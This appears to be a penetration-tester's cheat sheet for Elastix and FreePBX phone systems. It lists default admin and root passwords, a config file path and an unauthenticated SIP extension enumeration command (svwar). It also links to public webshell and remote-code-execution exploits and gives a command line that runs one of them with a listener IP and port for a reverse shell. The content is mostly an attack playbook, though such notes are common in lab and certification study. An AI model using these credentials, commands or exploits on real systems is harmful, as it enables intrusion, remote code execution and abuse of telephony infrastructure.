# elastic freepbx

**NOTE: Possible has vtiger CRM directory too.**

## How to verify version

```aspnet
# top left the 'i' icon > Version
```

## Default creds

```
admin:admin
root:root
admin:sangoma
root:sangoma
```

## Interesting Paths

```
# config file path
- /etc/amportal.conf
```

## Find PBX Extension

```
# authenticated
Head to PBX after logging into Elastix and can see existing extensions / create new (image in end)
https://IP/index.php?menu=pbxconfig

# unAuthenticated
$ svwar -m INVITE -e001-999 IP
```

## Create new PBX extension (authenticated)

## freepbx 13 (Authenticated)

v13.0.151 | 13.0.188.8

```
# PHP weshell using Admin Module
https://github.com/DarkCoderSc/freepbx-shell-admin-module

# RCE + PE
https://github.com/chrisjd20/exploits/blob/master/freepbx.py
python freepbx.py -u http://10.2.2.109 -l 10.2.2.115 -p 4444 -s R
```

## elastix 2.2.0

```
https://github.com/infosecjunky/FreePBX-2.10.0---Elastix-2.2.0---Remote-Code-Execution

https://www.exploit-db.com/exploits/18650 (follow Beep for error-fix)
https://github.com/am0nsec/exploit/blob/master/unix/webapp/FreePBX-2.10/freepbx_2.10_with_ssl.py
```
